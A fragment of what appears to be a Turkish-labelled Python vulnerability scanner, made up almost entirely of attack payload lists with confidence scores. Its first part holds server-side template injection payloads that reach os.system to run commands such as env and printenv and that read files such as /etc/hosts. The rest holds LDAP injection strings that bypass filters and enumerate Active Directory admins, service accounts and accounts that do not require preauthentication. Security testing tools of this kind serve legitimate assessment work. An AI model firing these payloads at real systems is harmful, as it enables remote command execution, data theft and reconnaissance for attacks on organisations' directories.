    {"payload": "{{staticmethod(lambda: 1).__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('/etc/hosts').read()}}", "guven": 0.83, "aciklama": "Staticmethod file read"},
    {"payload": "{{staticmethod.__func__}}", "guven": 0.53, "aciklama": "Staticmethod func attribute"},
    
    # Classmethod Exploitation
    {"payload": "{{classmethod.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('w')}}", "guven": 0.76, "aciklama": "Classmethod class OS access"},
    {"payload": "{{classmethod(lambda cls: cls).__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('datetime').datetime.now()}}", "guven": 0.80, "aciklama": "Classmethod datetime"},
    {"payload": "{{classmethod.__func__}}", "guven": 0.52, "aciklama": "Classmethod func attribute"},
    
    # Type Function Exploitation
    {"payload": "{{type.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('history')}}", "guven": 0.75, "aciklama": "Type class OS access"},
    {"payload": "{{type('').__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('7*7')}}", "guven": 0.84, "aciklama": "Type string eval"},
    {"payload": "{{type.__name__}}", "guven": 0.51, "aciklama": "Type name attribute"},
    {"payload": "{{type.__module__}}", "guven": 0.50, "aciklama": "Type module attribute"},
    {"payload": "{{type.__bases__}}", "guven": 0.49, "aciklama": "Type bases attribute"},
    {"payload": "{{type.__dict__}}", "guven": 0.48, "aciklama": "Type dict attribute"},
    
    # Object Function Exploitation
    {"payload": "{{object.__class__.__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('env')}}", "guven": 0.89, "aciklama": "Object direct subclasses"},
    {"payload": "{{object().__class__.__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('printenv')}}", "guven": 0.91, "aciklama": "Object instance import"},
    {"payload": "{{object.__new__}}", "guven": 0.47, "aciklama": "Object new method"},
    {"payload": "{{object.__init__}}", "guven": 0.46, "aciklama": "Object init method"},
    {"payload": "{{object.__str__}}", "guven": 0.45, "aciklama": "Object str method"},
    {"payload": "{{object.__repr__}}", "guven": 0.44, "aciklama": "Object repr method"},
    {"payload": "{{object.__hash__}}", "guven": 0.43, "aciklama": "Object hash method"},
    {"payload": "{{object.__eq__}}", "guven": 0.42, "aciklama": "Object eq method"},
    {"payload": "{{object.__ne__}}", "guven": 0.41, "aciklama": "Object ne method"},
    {"payload": "{{object.__class__}}", "guven": 0.40, "aciklama": "Object class attribute"},
    
    # Exception Sınıfları Exploitation
    {"payload": "{{Exception.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('dmesg')}}", "guven": 0.87, "aciklama": "Exception class OS access"},
    {"payload": "{{BaseException.__subclasses__()[0].__init__.__globals__['sys'].modules['os'].system('lsmod')}}", "guven": 0.88, "aciklama": "BaseException subclass"},
    {"payload": "{{ValueError.__init__.__globals__['sys'].modules['os'].system('lsof')}}", "guven": 0.86, "aciklama": "ValueError OS access"},
    {"payload": "{{TypeError.__init__.__globals__['__builtins__']['open']('/var/log/syslog').read()}}", "guven": 0.85, "aciklama": "TypeError file read"},
    {"payload": "{{AttributeError.__init__.__globals__['__builtins__']['__import__']('pwd').getpwuid(0)}}", "guven": 0.84, "aciklama": "AttributeError pwd module"},
    {"payload": "{{KeyError.__init__.__globals__['__builtins__']['eval']('8*8')}}", "guven": 0.83, "aciklama": "KeyError eval"},
    {"payload": "{{IndexError.__init__.__globals__['__builtins__']['exec']('import sys; print(sys.path)')}}", "guven": 0.82, "aciklama": "IndexError exec"},
    {"payload": "{{RuntimeError.__init__.__globals__.keys()}}", "guven": 0.79, "aciklama": "RuntimeError globals"},
    {"payload": "{{ImportError.__init__.__globals__['sys'].executable}}", "guven": 0.80, "aciklama": "ImportError executable"},
    {"payload": "{{NameError.__init__.__globals__['sys'].version}}", "guven": 0.78, "aciklama": "NameError version"},
    
    # Warning Sınıfları Exploitation
    {"payload": "{{Warning.__subclasses__()[0].__init__.__globals__['sys'].modules['os'].system('sensors')}}", "guven": 0.81, "aciklama": "Warning subclass OS"},
    {"payload": "{{UserWarning.__init__.__globals__['__builtins__']['open']('/proc/loadavg').read()}}", "guven": 0.82, "aciklama": "UserWarning file read"},
    {"payload": "{{DeprecationWarning.__init__.__globals__['sys'].platform}}", "guven": 0.77, "aciklama": "DeprecationWarning platform"},
    {"payload": "{{FutureWarning.__init__.__globals__['__builtins__']['__import__']('getpass').getuser()}}", "guven": 0.83, "aciklama": "FutureWarning getuser"},
    {"payload": "{{PendingDeprecationWarning.__init__.__globals__.values()}}", "guven": 0.76, "aciklama": "PendingDeprecationWarning values"},
            ],
            
           ZafiyetTipi.LDAP: [
    # Temel LDAP Injection Payloadları (1-20)
    {"payload": "*", "guven": 0.8, "aciklama": "Wildcard LDAP bypass"},
    {"payload": "*)(&", "guven": 0.85, "aciklama": "LDAP operatör bypass"},
    {"payload": "*)(uid=*))(|(uid=*", "guven": 0.9, "aciklama": "Karmaşık LDAP bypass"},
    {"payload": "admin)(&(password=*))", "guven": 0.85, "aciklama": "Admin LDAP bypass"},
    {"payload": "*)(&(objectClass=*)", "guven": 0.85, "aciklama": "ObjectClass wildcard"},
    {"payload": "*)(cn=*))(|(cn=*", "guven": 0.85, "aciklama": "Common name bypass"},
    {"payload": "admin*)((|userPassword=*)", "guven": 0.85, "aciklama": "Password field bypass"},
    {"payload": "*)(|(mail=*@*))(|(cn=*", "guven": 0.8, "aciklama": "Email wildcard bypass"},
    {"payload": "*))(|(objectClass=user", "guven": 0.82, "aciklama": "User objectClass injection"},
    {"payload": "*)(sAMAccountName=*))(|(sAMAccountName=*", "guven": 0.88, "aciklama": "SAM account bypass"},
    {"payload": "admin*)((|memberOf=*)", "guven": 0.85, "aciklama": "Group membership bypass"},
    {"payload": "*)(|(distinguishedName=*))(|(cn=*", "guven": 0.83, "aciklama": "Distinguished name bypass"},
    {"payload": "*)(&(userPrincipalName=*@*)", "guven": 0.84, "aciklama": "UPN wildcard bypass"},
    {"payload": "*)(|(givenName=*))(|(sn=*", "guven": 0.81, "aciklama": "Name field bypass"},
    {"payload": "admin*)((|displayName=*)", "guven": 0.82, "aciklama": "Display name bypass"},
    {"payload": "*)(|(telephoneNumber=*))(|(mobile=*", "guven": 0.79, "aciklama": "Phone number bypass"},
    {"payload": "*)(&(department=*)", "guven": 0.80, "aciklama": "Department field bypass"},
    {"payload": "*)(|(title=*))(|(description=*", "guven": 0.78, "aciklama": "Title description bypass"},
    {"payload": "root*)((|homeDirectory=*)", "guven": 0.86, "aciklama": "Home directory bypass"},
    {"payload": "*)(|(loginShell=*))(|(uid=*", "guven": 0.84, "aciklama": "Shell bypass"},

    # Gelişmiş Boolean Logic Payloadları (21-50)
    {"payload": "*))(|(&(objectClass=person)(cn=admin))", "guven": 0.87, "aciklama": "Complex boolean person query"},
    {"payload": "*)(|(&(objectClass=user)(!(disabled=TRUE)))", "guven": 0.89, "aciklama": "Active user enumeration"},
    {"payload": "*))(|(&(objectClass=group)(cn=*admin*))", "guven": 0.86, "aciklama": "Admin group enumeration"},
    {"payload": "*)(|(&(objectClass=organizationalUnit)(ou=*))", "guven": 0.83, "aciklama": "OU enumeration"},
    {"payload": "*))(|(&(objectClass=computer)(cn=*))", "guven": 0.84, "aciklama": "Computer object enumeration"},
    {"payload": "*)(|(&(objectClass=contact)(mail=*))", "guven": 0.82, "aciklama": "Contact enumeration"},
    {"payload": "*))(|(&(objectClass=*)(!(objectClass=computer)))", "guven": 0.85, "aciklama": "Non-computer objects"},
    {"payload": "*)(|(&(objectClass=user)(userAccountControl=512))", "guven": 0.88, "aciklama": "Normal user accounts"},
    {"payload": "*))(|(&(objectClass=user)(userAccountControl=514))", "guven": 0.87, "aciklama": "Disabled user accounts"},
    {"payload": "*)(|(&(objectClass=user)(adminCount=1))", "guven": 0.90, "aciklama": "Privileged user detection"},
    {"payload": "*))(|(&(objectClass=group)(groupType=-2147483646))", "guven": 0.86, "aciklama": "Security group enumeration"},
    {"payload": "*)(|(&(objectClass=user)(lastLogon>=*))", "guven": 0.84, "aciklama": "Recent login enumeration"},
    {"payload": "*))(|(&(objectClass=user)(pwdLastSet=0))", "guven": 0.88, "aciklama": "Password never set"},
    {"payload": "*)(|(&(objectClass=user)(logonCount=0))", "guven": 0.85, "aciklama": "Never logged in users"},
    {"payload": "*))(|(&(objectClass=user)(badPwdCount>=3))", "guven": 0.89, "aciklama": "Locked account detection"},
    {"payload": "*)(|(&(objectClass=user)(servicePrincipalName=*))", "guven": 0.91, "aciklama": "Service account detection"},
    {"payload": "*))(|(&(objectClass=*)(createTimeStamp>=*))", "guven": 0.83, "aciklama": "Recently created objects"},
    {"payload": "*)(|(&(objectClass=user)(whenCreated>=*))", "guven": 0.84, "aciklama": "Recently created users"},
    {"payload": "*))(|(&(objectClass=*)(modifyTimeStamp>=*))", "guven": 0.82, "aciklama": "Recently modified objects"},
    {"payload": "*)(|(&(objectClass=user)(accountExpires=0))", "guven": 0.86, "aciklama": "Never expiring accounts"},
    {"payload": "*))(|(&(objectClass=user)(passwordNeverExpires=TRUE))", "guven": 0.87, "aciklama": "Non-expiring passwords"},
    {"payload": "*)(|(&(objectClass=user)(userCannotChangePassword=TRUE))", "guven": 0.85, "aciklama": "Password change restriction"},
    {"payload": "*))(|(&(objectClass=user)(passwordNotRequired=TRUE))", "guven": 0.89, "aciklama": "No password required"},
    {"payload": "*)(|(&(objectClass=user)(smartcardLogonRequired=TRUE))", "guven": 0.84, "aciklama": "Smartcard required users"},
    {"payload": "*))(|(&(objectClass=user)(trustedForDelegation=TRUE))", "guven": 0.92, "aciklama": "Delegation trusted users"},
    {"payload": "*)(|(&(objectClass=user)(dontRequirePreauth=TRUE))", "guven": 0.93, "aciklama": "No preauth required"},
    {"payload": "*))(|(&(objectClass=computer)(userAccountControl=4096))", "guven": 0.85, "aciklama": "Workstation trust accounts"},
    {"payload": "*)(|(&(objectClass=computer)(operatingSystem=Windows*))", "guven": 0.83, "aciklama": "Windows computer enumeration"},
    {"payload": "*))(|(&(objectClass=computer)(servicePrincipalName=*))", "guven": 0.86, "aciklama": "Computer service accounts"},
    {"payload": "*)(|(&(objectClass=group)(member=*))", "guven": 0.84, "aciklama": "Non-empty group enumeration"},

    # Attribute Enumeration Payloadları (51-100)
    {"payload": "*))(|(homePhone=*)(telephoneNumber=*)(mobile=*", "guven": 0.78, "aciklama": "Phone number enumeration"},
    {"payload": "*)(|(postalAddress=*)(streetAddress=*)(l=*", "guven": 0.77, "aciklama": "Address information bypass"},
    {"payload": "*))(|(jpegPhoto=*)(thumbnailPhoto=*)(photo=*", "guven": 0.76, "aciklama": "Photo attribute enumeration"},
    {"payload": "*)(|(manager=*)(directReports=*)(secretary=*", "guven": 0.81, "aciklama": "Organizational hierarchy"},
    {"payload": "*))(|(extensionAttribute1=*)(extensionAttribute5=*)(extensionAttribute10=*", "guven": 0.79, "aciklama": "Extension attributes"},
    {"payload": "*)(|(proxyAddresses=*)(targetAddress=*)(legacyExchangeDN=*", "guven": 0.82, "aciklama": "Exchange attributes"},
    {"payload": "*))(|(homeDrive=*)(homeDirectory=*)(profilePath=*", "guven": 0.84, "aciklama": "User profile attributes"},
    {"payload": "*)(|(scriptPath=*)(logonScript=*)(homeDirectory=*", "guven": 0.83, "aciklama": "Logon script enumeration"},
    {"payload": "*))(|(userWorkstations=*)(logonWorkstation=*)(userParameters=*", "guven": 0.80, "aciklama": "Workstation restrictions"},
    {"payload": "*)(|(employeeID=*)(employeeNumber=*)(employeeType=*", "guven": 0.78, "aciklama": "Employee information"},
    {"payload": "*))(|(costCenter=*)(company=*)(division=*", "guven": 0.77, "aciklama": "Corporate structure"},
    {"payload": "*)(|(otherTelephone=*)(otherHomePhone=*)(otherMobile=*", "guven": 0.76, "aciklama": "Alternative phone numbers"},
    {"payload": "*))(|(otherMailbox=*)(altRecipient=*)(deliverAndRedirect=*", "guven": 0.79, "aciklama": "Mail forwarding attributes"},
    {"payload": "*)(|(msExchMailboxGuid=*)(msExchArchiveGUID=*)(msExchArchiveName=*", "guven": 0.81, "aciklama": "Exchange mailbox info"},
    {"payload": "*))(|(msDS-PrincipalName=*)(altSecurityIdentities=*)(objectSid=*", "guven": 0.85, "aciklama": "Security identifier info"},
    {"payload": "*)(|(lastLogonTimestamp=*)(lastLogoff=*)(logonHours=*", "guven": 0.84, "aciklama": "Logon timing information"},
    {"payload": "*))(|(lockoutTime=*)(badPasswordTime=*)(pwdLastSet=*", "guven": 0.87, "aciklama": "Password timing info"},
    {"payload": "*)(|(userCertificate=*)(cACertificate=*)(certificateTemplates=*", "guven": 0.82, "aciklama": "Certificate attributes"},
    {"payload": "*))(|(msDS-UserPasswordExpiryTimeComputed=*)(msDS-UserAccountDisabled=*", "guven": 0.86, "aciklama": "Computed attributes"},
    {"payload": "*)(|(sidHistory=*)(primaryGroupID=*)(tokenGroups=*", "guven": 0.88, "aciklama": "Group membership info"},
    {"payload": "*))(|(nTSecurityDescriptor=*)(objectCategory=*)(instanceType=*", "guven": 0.83, "aciklama": "Security descriptor info"},
    {"payload": "*)(|(canonicalName=*)(distinguishedName=*)(objectGUID=*", "guven": 0.82, "aciklama": "Object identification"},
    {"payload": "*))(|(whenChanged=*)(whenCreated=*)(uSNChanged=*", "guven": 0.81, "aciklama": "Object modification info"},
    {"payload": "*)(|(dSCorePropagationData=*)(replPropertyMetaData=*)(replUpToDateVector=*", "guven": 0.80, "aciklama": "Replication metadata"},
    {"payload": "*))(|(msDS-RevealedDSAs=*)(msDS-RevealedUsers=*)(msDS-NeverRevealGroup=*", "guven": 0.79, "aciklama": "RODC specific attributes"},
    {"payload": "*)(|(msDS-AllowedToActOnBehalfOfOtherIdentity=*)(msDS-GroupMSAMembership=*", "guven": 0.89, "aciklama": "Delegation attributes"},
    {"payload": "*))(|(msDS-SupportedEncryptionTypes=*)(msDS-KeyVersionNumber=*", "guven": 0.87, "aciklama": "Kerberos encryption info"},
    {"payload": "*)(|(msDS-ResultantPSO=*)(msDS-PSO*)(pwdProperties=*", "guven": 0.85, "aciklama": "Password policy info"},
    {"payload": "*))(|(msDS-AuthenticatedAtDC=*)(msDS-IsPartialReplicaFor=*", "guven": 0.78, "aciklama": "Authentication metadata"},
    {"payload": "*)(|(msDS-ExternalStore=*)(msDS-PhoneticDisplayName=*", "guven": 0.76, "aciklama": "Extended attributes"},
    {"payload": "*))(|(comment=*)(info=*)(notes=*", "guven": 0.75, "aciklama": "Comment fields"},
    {"payload": "*)(|(url=*)(wWWHomePage=*)(personalTitle=*", "guven": 0.74, "aciklama": "Web and personal info"},
    {"payload": "*))(|(carLicense=*)(preferredLanguage=*)(countryCode=*", "guven": 0.73, "aciklama": "Miscellaneous attributes"},
    {"payload": "*)(|(roomNumber=*)(physicalDeliveryOfficeName=*)(postOfficeBox=*", "guven": 0.75, "aciklama": "Location attributes"},
    {"payload": "*))(|(assistant=*)(personalPager=*)(otherPager=*", "guven": 0.74, "aciklama": "Contact assistant info"},
    {"payload": "*)(|(middleName=*)(initials=*)(generationQualifier=*", "guven": 0.73, "aciklama": "Name components"},
    {"payload": "*))(|(ipPhone=*)(internationalISDNNumber=*)(facsimileTelephoneNumber=*", "guven": 0.76, "aciklama": "Communication methods"},
    {"payload": "*)(|(businessCategory=*)(employeeType=*)(organizationalStatus=*", "guven": 0.77, "aciklama": "Business classification"},
    {"payload": "*))(|(preferredDeliveryMethod=*)(registeredAddress=*)(destinationIndicator=*", "guven": 0.75, "aciklama": "Delivery preferences"},
    {"payload": "*)(|(searchGuide=*)(seeAlso=*)(userSMIMECertificate=*", "guven": 0.74, "aciklama": "Reference attributes"},
    {"payload": "*))(|(audio=*)(userPKCS12=*)(labeledURI=*", "guven": 0.73, "aciklama": "Multimedia attributes"},
    {"payload": "*)(|(secretary=*)(roomNumber=*)(carLicense=*", "guven": 0.75, "aciklama": "Administrative attributes"},
    {"payload": "*))(|(x121Address=*)(telexNumber=*)(teletexTerminalIdentifier=*", "guven": 0.72, "aciklama": "Legacy communication"},
    {"payload": "*)(|(organizationalUnitName=*)(localityName=*)(stateOrProvinceName=*", "guven": 0.78, "aciklama": "Geographic attributes"},
    {"payload": "*))(|(businessRole=*)(departmentNumber=*)(employeeNumber=*", "guven": 0.79, "aciklama": "HR attributes"},
    {"payload": "*)(|(preferredLanguage=*)(userClass=*)(host=*", "guven": 0.74, "aciklama": "User preferences"},
    {"payload": "*))(|(documentIdentifier=*)(documentTitle=*)(documentVersion=*", "guven": 0.73, "aciklama": "Document attributes"},
    {"payload": "*)(|(associatedDomain=*)(associatedName=*)(homePostalAddress=*", "guven": 0.75, "aciklama": "Association attributes"},
    {"payload": "*))(|(janetMailbox=*)(rfc822Mailbox=*)(textEncodedORAddress=*", "guven": 0.76, "aciklama": "Mail system attributes"},
    {"payload": "*)(|(drink=*)(roomNumber=*)(personalSignature=*", "guven": 0.71, "aciklama": "Personal preference attributes"},
    {"payload": "*))(|(dmdName=*)(knowledgeInformation=*)(presentationAddress=*", "guven": 0.72, "aciklama": "Directory metadata"},

    # Nested Query Payloadları (101-150)
    {"payload": "*))(|(&(&(objectClass=user)(cn=admin*))(memberOf=*admin*))", "guven": 0.91, "aciklama": "Nested admin user query"},
    {"payload": "*)(|(&(&(objectClass=group)(cn=*admin*))(member=*))", "guven": 0.89, "aciklama": "Admin group with members"},
    {"payload": "*))(|(&(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))(adminCount=1))", "guven": 0.93, "aciklama": "Active privileged users"},
    {"payload": "*)(|(&(&(objectClass=computer)(operatingSystem=Windows*))(servicePrincipalName=*))", "guven": 0.87, "aciklama": "Windows service computers"},
    {"payload": "*))(|(&(&(objectClass=user)(userPrincipalName=*@*))(lastLogon>=*))", "guven": 0.86, "aciklama": "Recently active UPN users"},
    {"payload": "*)(|(&(&(objectClass=*)(createTimeStamp>=20240101*))(!(objectClass=computer)))", "guven": 0.84, "aciklama": "Recent non-computer objects"},
    {"payload": "*))(|(&(&(objectClass=user)(department=*))(manager=*))", "guven": 0.82, "aciklama": "Departmental managed users"},
    {"payload": "*)(|(&(&(objectClass=group)(groupType=-2147483646))(member=*admin*))", "guven": 0.90, "aciklama": "Security groups with admins"},
    {"payload": "*))(|(&(&(objectClass=user)(servicePrincipalName=*))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.92, "aciklama": "Active service accounts"},
    {"payload": "*)(|(&(&(objectClass=user)(pwdLastSet=0))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.94, "aciklama": "Active users no password set"},
    {"payload": "*))(|(&(&(objectClass=user)(badPwdCount>=1))(lockoutTime=0))", "guven": 0.88, "aciklama": "Failed login not locked"},
    {"payload": "*)(|(&(&(objectClass=user)(logonCount=0))(whenCreated>=*))", "guven": 0.87, "aciklama": "New users never logged in"},
    {"payload": "*))(|(&(&(objectClass=user)(accountExpires=0))(adminCount=1))", "guven": 0.91, "aciklama": "Never expiring admin accounts"},
    {"payload": "*)(|(&(&(objectClass=user)(passwordNeverExpires=TRUE))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.89, "aciklama": "Active non-expiring passwords"},
    {"payload": "*))(|(&(&(objectClass=user)(trustedForDelegation=TRUE))(servicePrincipalName=*))", "guven": 0.95, "aciklama": "Trusted delegation services"},
    {"payload": "*)(|(&(&(objectClass=user)(dontRequirePreauth=TRUE))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.96, "aciklama": "Active no preauth users"},
    {"payload": "*))(|(&(&(objectClass=computer)(userAccountControl=4096))(servicePrincipalName=*))", "guven": 0.88, "aciklama": "Service workstation accounts"},
    {"payload": "*)(|(&(&(objectClass=user)(homeDirectory=*)(profilePath=*))", "guven": 0.83, "aciklama": "Users with profile paths"},
    {"payload": "*))(|(&(&(objectClass=user)(scriptPath=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.85, "aciklama": "Active users with login scripts"},
    {"payload": "*)(|(&(&(objectClass=user)(userWorkstations=*)(!(userWorkstations=*)))", "guven": 0.84, "aciklama": "Workstation restricted users"},
    {"payload": "*))(|(&(&(objectClass=user)(proxyAddresses=*))(mail=*))", "guven": 0.81, "aciklama": "Users with proxy addresses"},
    {"payload": "*)(|(&&(objectClass=user)(msExchMailboxGuid=*)(!(msExchArchiveGUID=*))", "guven": 0.82, "aciklama": "Mailbox without archive"},
    {"payload": "*))(|(&(&(objectClass=user)(userCertificate=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))", "guven": 0.86, "aciklama": "Active cert users"},
    {"payload": "*)(|(&(&(objectClass=user)(sidHistory=*)(adminCount=1))", "guven": 0.93, "aciklama": "Admin users with SID history"},
    {"payload": "*))(|(&(&(objectClass=user)(primaryGroupID=512))(adminCount=1))", "guven": 0.90, "aciklama": "Domain admin accounts"},
    {"payload": "*)(|(&(&(objectClass=group)(groupType=-2147483640))(member=*))", "guven": 0.85, "aciklama": "Distribution groups with members"},
    {"payload": "*))(|(&(&(objectClass=contact)(mail=*@*))(!(objectClass=user)))", "guven": 0.80, "aciklama": "Email contacts not users"},
    {"payload": "*)(|(&(&(objectClass=user)(employeeID=*)(department=*))", "guven": 0.78, "aciklama": "Employees with departments"},
    {"payload": "*))(|(&(&(objectClass=user)(manager=*)(directReports=*))", "guven": 0.81, "aciklama": "Users with direct reports"},
    {"payload": "*)(|(&(&(objectClass=user)(telephoneNumber=*)(mobile=*))", "guven": 0.77, "aciklama": "Users with multiple phones"},
    {"payload": "*))(|(&(&(objectClass=user)(postalAddress=*)(!(l=)))", "guven": 0.79, "aciklama": "Users with complete addresses"},
    {"payload": "*)(|(&(&(objectClass=user)(jpegPhoto=*)(thumbnailPhoto=*))", "guven": 0.76, "aciklama": "Users with multiple photos"},
    {"payload": "*))(|(&(&(objectClass=user)(extensionAttribute1=*)(extensionAttribute5=*))", "guven": 0.78, "aciklama": "Users with extension attrs"},
    {"payload": "*)(|(&(&(objectClass=computer)(operatingSystem=*Server*)(servicePrincipalName=*))", "guven": 0.89, "aciklama": "Server computers with SPNs"},
    {"payload": "*))(|(&(&(objectClass=user)(lastLogonTimestamp>=*)(badPwdCount=0))", "guven": 0.83, "aciklama": "Recently active clean users"},
    {"payload": "*)(|(&(&(objectClass=user)(pwdLastSet>=*)(logonCount>=1))", "guven": 0.84, "aciklama": "Users with recent password"},
    {"payload": "*))(|(&(&(objectClass=user)(lockoutTime=0))(badPasswordTime=0))", "guven": 0.82, "aciklama": "Clean authentication users"},
    {"payload": "*)(|(&(&(objectClass=user)(userCertificate=*)(cACertificate=*))", "guven": 0.85, "aciklama": "Users with CA certificates"},
    {"payload": "*))(|(&(&(objectClass=user)(nTSecurityDescriptor=*)(adminCount=1))", "guven": 0.91, "aciklama": "Admin users with security desc"},
    {"payload": "*)(|(&(&(objectClass=user)(objectGUID=*)(objectSid=*))", "guven": 0.80, "aciklama": "Users with complete identifiers"},
    {"payload": "*))(|(&(&(objectClass=user)(whenChanged>=*)(uSNChanged>=*))", "guven": 0.81, "aciklama": "Recently modified users"},
    {"payload": "*)(|(&(&(objectClass=user)(canonicalName=*)(distinguishedName=*))", "guven": 0.79, "aciklama": "Users with canonical names"},
    {"payload": "*))(|(&(&(objectClass=user)(instanceType=4)(objectCategory=*))", "guven": 0.82, "aciklama": "Standard user instances"},
    {"payload": "*)(|(&(&(objectClass=group)(instanceType=4)(groupType<0))", "guven": 0.84, "aciklama": "Security group instances"},
    {"payload": "*))(|(&(&(objectClass=computer)(instanceType=4)(userAccountControl=4096))", "guven": 0.86, "aciklama": "Standard computer accounts"},
    {"payload": "*)(|(&(&(objectClass=organizationalUnit)(instanceType=4)(ou=*))", "guven": 0.81, "aciklama": "Standard OU instances"},
    {"payload": "*))(|(&(&(objectClass=user)(msDS-SupportedEncryptionTypes=*)(servicePrincipalName=*))", "guven": 0.88, "aciklama": "Service accounts with encryption"},
    {"payload": "*)(|(&(&(objectClass=user)(msDS-KeyVersionNumber=*)(userPrincipalName=*))", "guven": 0.87, "aciklama": "Users with key versions"},
    {"payload": "*))(|(&(&(objectClass=user)(pwdProperties=*)(msDS-ResultantPSO=*))", "guven": 0.86, "aciklama": "Users with password policies"},
    {"payload": "*)(|(&(&(objectClass=user)(msDS-AuthenticatedAtDC=*)(lastLogon>=*))", "guven": 0.83, "aciklama": "Users with auth DC info"},
    {"payload": "*))(|(&(&(objectClass=user)(comment=*)(description=*))", "guven": 0.75, "aciklama": "Users with comments"},

    # Time-Based Query Payloadları (151-200)
    {"payload": "*))(|(whenCreated>=20240101000000.0Z)(whenCreated<=20241231235959.0Z)", "guven": 0.84, "aciklama": "Objects created in 2024"},
    {"payload": "*)(|(whenChanged>=20240601000000.0Z)(uSNChanged>=1000000)", "guven": 0.83, "aciklama": "Recent changes with USN"},
    {"payload": "*))(|(lastLogon>=133000000000000000)(lastLogonTimestamp>=133000000000000000)", "guven": 0.87, "aciklama": "Recent logon timestamps"},
    {"payload": "*)(|(pwdLastSet>=133000000000000000)(badPasswordTime<=132999999999999999)", "guven": 0.85, "aciklama": "Recent password changes"},
    {"payload": "*))(|(lockoutTime>=133000000000000000)(lockoutTime<=133100000000000000)", "guven": 0.89, "aciklama": "Recent lockout times"},
    {"payload": "*)(|(accountExpires>=133200000000000000)(accountExpires<=133300000000000000)", "guven": 0.82, "aciklama": "Account expiration range"},
    {"payload": "*))(|(createTimeStamp>=20240701000000.0Z)(modifyTimeStamp>=20240701000000.0Z)", "guven": 0.84, "aciklama": "Summer 2024 activity"},
    {"payload": "*)(|(dSCorePropagationData>=20240101000000.0Z)(replPropertyMetaData>=*)", "guven": 0.81, "aciklama": "Replication activity 2024"},
    {"payload": "*))(|(msDS-UserPasswordExpiryTimeComputed>=133200000000000000)", "guven": 0.86, "aciklama": "Future password expiry"},
    {"payload": "*)(|(lastLogoff>=133000000000000000)(logonHours=*)", "guven": 0.80, "aciklama": "Logoff time with restrictions"},
    {"payload": "*))(|(&(whenCreated>=20240101*)(objectClass=user))", "guven": 0.85, "aciklama": "Users created this year"},
    {"payload": "*)(|(&(lastLogon>=133000000000000000)(objectClass=computer))", "guven": 0.87, "aciklama": "Recently active computers"},
    {"payload": "*))(|(&(pwdLastSet<=132500000000000000)(objectClass=user))", "guven": 0.88, "aciklama": "Users with old passwords"},
    {"payload": "*)(|(&(whenChanged>=20240901*)(adminCount=1))", "guven": 0.91, "aciklama": "Recently changed admin accounts"},
    {"payload": "*))(|(&(createTimeStamp>=20240801*)(objectClass=group))", "guven": 0.83, "aciklama": "Groups created recently"},
    {"payload": "*)(|(&(modifyTimeStamp>=20240901*)(objectClass=organizationalUnit))", "guven": 0.82, "aciklama": "Recently modified OUs"},
    {"payload": "*))(|(&(lastLogonTimestamp<=132000000000000000)(userAccountControl=512))", "guven": 0.89, "aciklama": "Stale normal user accounts"},
    {"payload": "*)(|(&(badPasswordTime>=133000000000000000)(badPwdCount>=1))", "guven": 0.87, "aciklama": "Recent failed authentications"},
    {"payload": "*))(|(&(lockoutTime=0)(badPasswordTime>=133000000000000000))", "guven": 0.85, "aciklama": "Failed auth not locked"},
    {"payload": "*)(|(&(accountExpires=0)(pwdLastSet>=133000000000000000))", "guven": 0.86, "aciklama": "Never expiring recent passwords"},

    # Complex Filter Combinations (201-250)
    {"payload": "*))(|(&(|(&(cn=admin*)(cn=*admin))(objectClass=user))(memberOf=*)", "guven": 0.92, "aciklama": "Admin named users in groups"},
    {"payload": "*)(|(&(|(&(sAMAccountName=admin*)(sAMAccountName=*admin))(objectClass=user))", "guven": 0.91, "aciklama": "Admin SAM account patterns"},
    {"payload": "*))(|(&(|(&(displayName=*admin*)(displayName=*Admin*))(objectClass=user))", "guven": 0.89, "aciklama": "Admin display name patterns"},
    {"payload": "*)(|(&(|(&(description=*admin*)(description=*service*))(objectClass=user))", "guven": 0.87, "aciklama": "Admin or service descriptions"},
    {"payload": "*))(|(&(|(&(title=*admin*)(title=*manager*))(objectClass=user))", "guven": 0.85, "aciklama": "Admin or manager titles"},
    {"payload": "*)(|(&(|(&(department=*IT*)(department=*Security*))(objectClass=user))", "guven": 0.84, "aciklama": "IT or Security departments"},
    {"payload": "*))(|(&(|(&(mail=*admin*@*)(mail=*root*@*))(objectClass=user))", "guven": 0.90, "aciklama": "Admin or root email patterns"},
    {"payload": "*)(|(&(|(&(userPrincipalName=admin*@*)(userPrincipalName=*admin@*))(objectClass=user))", "guven": 0.91, "aciklama": "Admin UPN patterns"},
    {"payload": "*))(|(&(|(&(servicePrincipalName=*SQL*)(servicePrincipalName=*HTTP*))(objectClass=user))", "guven": 0.88, "aciklama": "SQL or HTTP service accounts"},
    {"payload": "*)(|(&(|(&(homeDirectory=*admin*)(homeDirectory=*root*))(objectClass=user))", "guven": 0.86, "aciklama": "Admin or root home dirs"},
    {"payload": "*))(|(&(|(&(profilePath=*admin*)(scriptPath=*admin*))(objectClass=user))", "guven": 0.85, "aciklama": "Admin profile or script paths"},
    {"payload": "*)(|(&(|(&(employeeID=00*)(employeeID=99*))(objectClass=user))", "guven": 0.83, "aciklama": "Special employee ID patterns"},
    {"payload": "*))(|(&(|(&(telephoneNumber=*0000)(mobile=*0000))(objectClass=user))", "guven": 0.78, "aciklama": "Default phone number patterns"},
    {"payload": "*)(|(&(|(&(postalAddress=*admin*)(physicalDeliveryOfficeName=*admin*))(objectClass=user))", "guven": 0.80, "aciklama": "Admin physical locations"},
    {"payload": "*))(|(&(|(&(extensionAttribute1=*admin*)(extensionAttribute5=*VIP*))(objectClass=user))", "guven": 0.87, "aciklama": "Admin or VIP extension attrs"},
